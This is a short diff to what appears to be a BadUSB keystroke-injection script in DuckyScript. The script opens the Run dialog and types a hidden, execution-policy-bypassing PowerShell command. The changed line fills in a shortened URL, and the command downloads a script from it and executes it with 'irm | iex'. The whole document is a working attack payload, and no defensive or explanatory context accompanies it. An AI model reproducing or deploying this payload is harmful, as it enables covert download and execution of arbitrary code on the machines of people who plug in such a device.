@@ -11,7 +11,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C irm  | iex
+STRING powershell -NoP -Ep Bypass -W H -C irm https://n9.cl/mrflipper4 | iex
 ENTER
 
 
